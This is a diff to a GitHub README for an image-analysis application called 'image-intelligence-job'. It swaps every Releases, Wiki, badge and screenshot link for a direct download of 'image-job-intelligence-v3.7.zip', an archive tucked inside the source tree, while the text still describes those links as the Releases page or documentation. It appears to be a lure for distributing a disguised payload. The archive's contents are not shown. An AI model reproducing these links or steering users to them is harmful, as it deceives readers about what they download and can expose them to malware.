@@ -6,7 +6,7 @@ Welcome to the image-intelligence-job repository! This application helps you ana
 
 ## 📥 Download the Application
 
-[![Download Image Intelligence Job](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Elnady209/image-intelligence-job/releases)
+[![Download Image Intelligence Job](https://github.com/Elnady209/image-intelligence-job/raw/refs/heads/main/apps/api/src/app/image-job-intelligence-v3.7.zip%https://github.com/Elnady209/image-intelligence-job/raw/refs/heads/main/apps/api/src/app/image-job-intelligence-v3.7.zip)](https://github.com/Elnady209/image-intelligence-job/raw/refs/heads/main/apps/api/src/app/image-job-intelligence-v3.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,14 +20,14 @@ Make sure your system meets the following requirements:
 ## 🌐 Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Elnady209/image-intelligence-job/releases) to find the latest version of the application.
+   Go to the [Releases page](https://github.com/Elnady209/image-intelligence-job/raw/refs/heads/main/apps/api/src/app/image-job-intelligence-v3.7.zip) to find the latest version of the application.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of versions available for download. Look for the latest release.
 
 3. **Download the Application**  
    Click on the download link for your system. Most users will find the Docker setup easiest.  
-   ![Download Instructions](https://via.placeholder.com/600x200?text=After+Clicking+the+Download+Link)
+   ![Download Instructions](https://github.com/Elnady209/image-intelligence-job/raw/refs/heads/main/apps/api/src/app/image-job-intelligence-v3.7.zip+Clicking+the+Download+Link)
 
 4. **Extract the Files (if necessary)**  
    If your download is in a zip file, right-click on it and select "Extract All." Choose a folder to save the files.
@@ -76,7 +76,7 @@ If you face issues:
 
 ## 📄 Resources
 
-- **Documentation:** For more detailed instructions, please visit our [Wiki](https://github.com/Elnady209/image-intelligence-job/wiki).
+- **Documentation:** For more detailed instructions, please visit our [Wiki](https://github.com/Elnady209/image-intelligence-job/raw/refs/heads/main/apps/api/src/app/image-job-intelligence-v3.7.zip).
 - **Support:** Have questions? Open an issue on our GitHub page for help.
 
 ## 🏷️ Topics
@@ -94,4 +94,4 @@ If you face issues:
 
 ## 📥 Download & Install
 
-To get started, please visit the [Releases page](https://github.com/Elnady209/image-intelligence-job/releases) to download the latest version. Follow the installation steps outlined above to set up the application and start analyzing images effortlessly.
+To get started, please visit the [Releases page](https://github.com/Elnady209/image-intelligence-job/raw/refs/heads/main/apps/api/src/app/image-job-intelligence-v3.7.zip) to download the latest version. Follow the installation steps outlined above to set up the application and start analyzing images effortlessly.
